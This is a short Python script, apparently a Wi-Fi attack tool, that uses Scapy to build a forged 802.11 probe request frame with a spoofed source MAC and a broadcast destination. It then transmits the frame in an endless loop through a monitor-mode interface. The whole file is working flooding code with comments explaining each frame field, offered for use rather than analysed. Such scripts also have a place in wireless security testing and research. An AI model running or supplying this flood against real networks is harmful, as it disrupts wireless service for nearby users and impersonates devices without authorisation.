#!/usr/bin/env python3
from scapy.all import *
import sys

def print_usage():
    print("usage: ./flood_pr.py \"$interface\"")
    print("Provide the interface which has been put in monitor mode as the only arguement")

if len(sys.argv) != 2:
    print_usage()
    sys.exit(0)

interface=sys.argv[1]

# The RadioTap contains the channel information and 
# the flag 'FCS' indicating the type of Dot11 layer that is going to follow

radiotap = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna+RXFlags', \
            Flags="FCS", Rate = 6.0, ChannelFrequency=5180, ChannelFlags=320, \
            dBm_AntSignal=-31,RXFlags=0,notdecoded=b'') 


# The Dot11 Frame contains the DOT11FCS frame which indicates the source and destination mac address
# The source address will be a fake one and the destination will be broadcast address
# Dot11ProbeReq frame indicates that packet is a probe request
        
dot11_frame = Dot11FCS(subtype=4,type=0,proto=0,FCfield=0,ID=0, addr1='ff:ff:ff:ff:ff:ff', \
                addr2="04:f0:21:45:d5:37", addr3="be:da:de:ad:be:ef", SC=0,fcs=1188401703 ) \
            / Dot11ProbeReq() \
            / Dot11Elt(ID='SSID',len=0, info="") \
            / Dot11EltRates(ID=1,len=0,rates=[]) \
            / Dot11EltRates(ID=1,len=8,rates=[12,9,12,18,24,36,48,54]) \
            / Dot11EltHTCapabilities(ID=45) \
            / Dot11Elt(ID=127,len=0,info='') \
            / Dot11Elt(ID=114,len=0,info='') \
            / Dot11Elt(ID=191,len=0,info='')


# Combining the RadioTap and the DOT11 frames, the probe request packet is crafted
# User input is used to stop the flooding currently

pr_pkt = radiotap/dot11_frame

try: 
    while True:
        sendp(pr_pkt,iface=interface)
except KeyboardInterrupt:
    print("Stopped transmitting fake ProbeRequest frames")
            